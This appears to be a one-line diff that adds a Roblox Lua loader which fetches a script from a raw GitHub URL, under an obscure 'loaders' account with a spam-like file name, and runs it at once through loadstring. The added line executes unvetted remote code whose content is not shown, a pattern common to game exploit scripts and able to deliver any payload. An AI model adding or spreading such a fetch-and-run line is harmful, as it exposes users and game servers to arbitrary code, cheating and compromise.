@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/partsoapmakerremain/loaders/main/loaders/helmets-scooter-empire-spam1-avqkne68ib1sc1.lua"))()
